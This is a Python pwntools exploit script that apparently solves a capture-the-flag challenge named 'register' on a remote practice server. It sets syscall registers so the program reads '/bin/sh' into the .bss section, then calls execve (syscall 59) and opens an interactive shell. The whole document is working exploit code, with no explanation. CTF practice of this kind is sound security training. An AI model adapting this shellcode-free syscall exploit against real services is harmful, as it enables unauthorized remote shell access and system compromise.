from pwn import * 

r = remote("ctf.j0n9hyun.xyz", 3026)
#r = process("./register")
e = ELF("./register")
context.log_level = "debug"

bss = 0x601080+12
shell = "/bin/sh\x00"

def func(a1, a2, a3, a4, a5, a6, a7) :
    r.recvuntil(": ")
    r.sendline(str(a1))
    r.recvuntil(": ")
    r.sendline(str(a2))
    r.recvuntil(": ")
    r.sendline(str(a3))
    r.recvuntil(": ")
    r.sendline(str(a4))
    r.recvuntil(": ")
    r.sendline(str(a5))
    r.recvuntil(": ")
    r.sendline(str(a6))
    r.recvuntil(": ")
    r.sendline(str(a7))
    
func(0, 0, bss, 10, 0, 0, 0)
r.send(shell)
func(59, bss, 0, 0, 0, 0, 0)
sleep(5)
r.interactive()